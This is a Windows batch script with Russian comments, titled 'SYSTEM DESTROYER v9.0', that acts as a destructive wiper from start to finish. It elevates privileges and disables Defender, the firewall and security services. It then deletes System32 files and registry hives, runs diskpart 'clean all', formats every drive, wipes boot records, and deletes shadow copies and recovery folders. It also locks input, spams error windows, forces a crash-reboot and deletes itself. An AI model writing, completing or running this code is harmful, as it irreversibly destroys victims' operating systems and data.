@echo off
setlocal enabledelayedexpansion

:: ========== АВТОПОДЪЁМ ПРАВ ЧЕРЕЗ 3 МЕТОДА ==========
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs" && exit
)

mode con: cols=100 lines=35
title SYSTEM DESTROYER v9.0 - FINAL TERMINATION

:: ========== ФАЗА 0: ТОТАЛЬНОЕ УНИЧТОЖЕНИЕ ЗАЩИТЫ ==========
echo [0] EXTERMINATING ALL SECURITY SYSTEMS...

:: Уничтожаем Windows Defender полностью
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul

:: Останавливаем ВСЕ службы защиты
for %%s in (
    WinDefend, wscsvc, Sense, WdBoot, WdFilter, 
    MsMpSvc, NisSrv, SecurityHealthService, SgrmBroker,
    SgrmAgent, wuauserv, BITS, CryptSvc
) do (
    net stop %%s /y >nul 2>&1
    sc config %%s start= disabled >nul 2>&1
    sc delete %%s >nul 2>&1
)

:: Отключаем брандмауэр полностью
netsh advfirewall set allprofiles state off >nul 2>&1
netsh firewall set opmode disable >nul 2>&1

:: ========== ФАЗА 1: ЯДЕРНОЕ УНИЧТОЖЕНИЕ СИСТЕМНЫХ ФАЙЛОВ ==========
echo [1] NUCLEAR SYSTEM FILE DESTRUCTION...

:: Метод 1: Через PowerShell с обходом защиты
start "KERNEL1" /B /MIN powershell -Command "Get-ChildItem -Path 'C:\Windows\System32\*' -Include *.dll, *.exe, *.sys | ForEach-Object { try { $_.Delete()} catch { } }"

:: Метод 2: Низкоуровневое повреждение через fsutil
for %%f in (
    "C:\Windows\System32\ntoskrnl.exe"
    "C:\Windows\System32\hal.dll"
    "C:\Windows\System32\winload.exe"
    "C:\Windows\System32\smss.exe"
    "C:\Windows\System32\csrss.exe"
) do (
    if exist %%f (
        fsutil file setzerodata offset=0 length=999999999 "%%f" >nul 2>&1
        copy /y nul "%%f" >nul 2>&1
        del /f "%%f" >nul 2>&1
    )
)

:: Метод 3: Массовое удаление через robocopy с зеркалированием пустой папки
md "%temp%\empty" >nul 2>&1
start "MIRRORKILL" /B /MIN robocopy "%temp%\empty" "C:\Windows" /MIR /NJH /NJS /NP /R:0 /W:0

:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ДИСКОВОЙ СТРУКТУРЫ ==========
echo [2] PHYSICAL DISK STRUCTURE DESTRUCTION...

:: Создаем скрипт для полного уничтожения диска
(
echo select disk 0
echo clean all
echo convert gpt
echo create partition primary
echo format fs=RAW quick label="DESTROYED"
echo exit
) > %temp%\wipe.dps

start "DISKWIPE" /B /MIN diskpart /s %temp%\wipe.dps

:: Форматируем ВСЕ диски параллельно
for %%d in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        echo FORMATTING DRIVE %%d: WITH RAW FILESYSTEM
        start "RAW_%%d" /B /MIN cmd /c "echo y|format %%d: /FS:RAW /Q /X /V:TERMINATED"
        start "NTFS_%%d" /B /MIN cmd /c "echo y|format %%d: /FS:NTFS /Q /X /V:CORRUPTED"
    )
)

:: ========== ФАЗА 3: УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА НА НИЗКОМ УРОВНЕ ==========
echo [3] LOW-LEVEL BOOTLOADER DESTRUCTION...

:: Уничтожаем BCD
bcdedit /enum all /v | findstr "identifier" > %temp%\bcd_ids.txt
for /f "tokens=2 delims=:" %%i in (%temp%\bcd_ids.txt) do (
    bcdedit /delete {%%i} /f >nul 2>&1
)

:: Пишем случайные данные в MBR через debug
(
echo a
echo mov ax,0301
echo mov bx,0200
echo mov cx,0001
echo mov dx,0080
echo int 13
echo int 20
echo
echo g=100
echo q
) > %temp%\mbrkill.asm
debug < %temp%\mbrkill.asm >nul 2>&1

:: ========== ФАЗА 4: УНИЧТОЖЕНИЕ РЕЕСТРА И КОНФИГУРАЦИЙ ==========
echo [4] REGISTRY AND CONFIGURATION DESTRUCTION...

:: Полностью очищаем все кусты реестра
for %%h in (HKLM HKCU HKCR HKU HKCC) do (
    reg delete %%h /f >nul 2>&1
)

:: Физически удаляем файлы реестра
for %%f in (
    "C:\Windows\System32\config\SAM"
    "C:\Windows\System32\config\SYSTEM" 
    "C:\Windows\System32\config\SOFTWARE"
    "C:\Windows\System32\config\SECURITY"
    "C:\Windows\System32\config\DEFAULT"
) do (
    if exist %%f (
        takeown /f %%f >nul 2>&1
        icacls %%f /grant Everyone:F >nul 2>&1
        del /f %%f >nul 2>&1
        fsutil file setzerodata offset=0 length=1048576 "%%f" >nul 2>&1
    )
)

:: ========== ФАЗА 5: ТОТАЛЬНАЯ БЛОКИРОВКА И ПЕРЕГРУЗКА СИСТЕМЫ ==========
echo [5] TOTAL SYSTEM LOCKDOWN AND OVERLOAD...

:: Убиваем ВСЕ критические процессы
start "PROCKILL" /B /MIN powershell -Command "while($true){Get-Process | Where-Object {$_.ProcessName -notmatch '^(csrss|wininit|smss|System)$'} | Stop-Process -Force}"

:: Блокируем клавиатуру полностью
start "KEYDEATH" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}{F6}{F7}{F8}{F9}{F10}{F11}{F12}'); sleep -m 10}"

:: Блокируем мышь в углу экрана
start "MOUSEDEATH" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); sleep -m 50}"

:: Спам окнами ошибок
start "ERRORSPAM1" /B /MIN powershell -Command "while($true){$w=New-Object -ComObject Wscript.Shell;$w.Popup('SYSTEM TERMINATED',0,'FATAL ERROR',0+16); sleep 1}"
start "ERRORSPAM2" /B /MIN powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('PC DESTROYED','TERMINAL FAILURE',0,16); sleep 2}"

:: ========== ФАЗА 6: УНИЧТОЖЕНИЕ ВОССТАНОВЛЕНИЯ И ТЕНЕВЫХ КОПИЙ ==========
echo [6] RECOVERY AND SHADOW COPY DESTRUCTION...

vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1

for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
    vssadmin delete shadows /for=%%d /quiet >nul 2>&1
    wbadmin delete systemstatebackup -backupTarget:%%d\ -quiet >nul 2>&1
)

:: Удаляем ВСЕ папки восстановления
for %%f in (
    "C:\System Volume Information"
    "C:\Recovery"
    "C:\$Recycle.Bin"
    "C:\Windows.old"
    "C:\Boot"
    "C:\EFI"
    "C:\PerfLogs"
) do (
    if exist %%f (
        takeown /f %%f /r /d y >nul 2>&1
        icacls %%f /grant Everyone:F /t /c /q >nul 2>&1
        rd /s /q %%f >nul 2>&1
    )
)

:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ С ГРАФИЧЕСКИМ ИНТЕРФЕЙСОМ ==========
echo.
echo ====================================================
echo          FINAL COUNTDOWN TO SYSTEM DEATH
echo ====================================================
echo.

for /l %%i in (15,-1,0) do (
    cls
    echo.
    echo    ╔══════════════════════════════════════════════════╗
    echo    ║           SYSTEM TERMINATION PROTOCOL           ║
    echo    ║           TIME TO DESTRUCTION: %%i SECONDS       ║
    echo    ╚══════════════════════════════════════════════════╝
    echo.
    echo    [SYSTEM STATUS]
    echo    ■ Bootloader: COMPLETELY DESTROYED
    echo    ■ System Files: 100%% CORRUPTED
    echo    ■ Disk Structure: RAW FORMATTED
    echo    ■ Registry: PERMANENTLY DELETED
    echo    ■ Recovery: TOTALLY ERASED
    echo.
    echo    [DESTRUCTION PROGRESS]
    set /a bars=%%i*2
    set "progress="
    for /l %%j in (1,1,30) do (
        if %%j LEQ !bars! (set "progress=!progress!█") else (set "progress=!progress!░")
    )
    echo    !progress! !bars!0%%
    echo.
    echo    [LAST ERROR CODES]
    echo    ERROR 0xC000021A: STATUS_SYSTEM_PROCESS_TERMINATED
    echo    ERROR 0x80070002: FILE_NOT_FOUND
    echo    ERROR 0xC0000142: DLL_INITIALIZATION_FAILED
    echo.
    timeout /t 1 /nobreak >nul
)

:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА С МУЛЬТИПЛЕКСИРОВАНИЕМ ==========
echo.
echo ====================================================
echo          EXECUTING FINAL TERMINATION
echo ====================================================
echo.

echo [FINAL] Launching multi-vector reboot...
start "REBOOT1" /B /MIN shutdown /r /f /t 0
start "REBOOT2" /B /MIN wmic os call reboot
start "REBOOT3" /B /MIN powershell -Command "Restart-Computer -Force"
start "REBOOT4" /B /MIN rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0
start "REBOOT5" /B /MIN rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6

:: Самоликвидация и очистка следов
del "%~f0" >nul 2>&1
rd /s /q "%temp%" >nul 2>&1

exit
